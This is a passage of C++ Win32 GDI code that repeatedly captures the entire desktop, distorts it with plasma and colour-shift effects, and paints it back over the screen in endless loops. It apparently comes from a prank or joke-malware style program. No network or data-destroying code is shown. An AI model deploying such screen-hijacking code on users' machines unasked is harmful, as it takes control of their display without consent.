                    float fx3 = (float)(tan(x / 500.0f - y / (float)h * 0.1f) + i / 5.0f);
                    float fx4 = (fx + fx2 + fx3) * (fx + fx2 + fx3);

                    BYTE v = (BYTE)(fx4 * 32.0f);

                    pixels[idx].r += 10;
                    pixels[idx].g += v;
                    //pixels[idx].b += v >> 2;
                }
            }

            i += 0.05f;

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(1);
        }

        return 0;
    }
}
//lastgdi
namespace p9 {
    typedef union _TRGBQUAD {
        COLORREF rgborg;
        struct {
            BYTE r;
            BYTE g;
            BYTE b;
            BYTE Reserved;
        };
    } TRGBQUAD, * PTRGBQUAD;
    DWORD WINAPI GDI(LPVOID lpParam)
    {
        // Get screen size
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int ws = w / 2;
        int hs = h / 2;

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi.bmiHeader);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = -hs; // negative for top-down
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* pixels = nullptr;
        HBITMAP bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(dcCopy, bmp);

        double angle = 0.0;
        int i = 0;

        while (true) {
            // Capture the screen scaled down
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            // Loop over each pixel
            for (int y = 0; y < hs; y++) {
                for (int x = 0; x < ws; x++) {
                    int index = y * ws + x;

                    int cx = x - ws / 3;
                    int cy = y - hs / 3;

                    int zx = (int)(cos(angle) * cx - sin(angle) * cy);
                    int zy = (int)(sin(angle) * cx + cos(angle) * cy);

                    int j = 4 * i;

                    // Old-school plasma effect, credits to JhoPro, but replaced hsl to trgbquad non-hsl
                    int fx = (int)(
                        j + j * sin(x / 16.0) +
                        j + j * sin(y / 8.0) +
                        j + j * sin((x + y) / 16.0) +
                        j + j * sin(sqrt((double)(x * x + y * y)) / 8.0)
                        ) / 4;

                    int code = (fx)+(w - (x * 4) + y) * i;

                    // Apply effect using TRGBQUAD
                    pixels[index].rgborg += ((y / 4) << (code / 1024)); // ARGB style
                }
            }

            // Draw back scaled up
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            i++;
            angle += 0.01;

            Sleep(1);
        }

        DeleteObject(bmp);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);

        return 0;
    }
}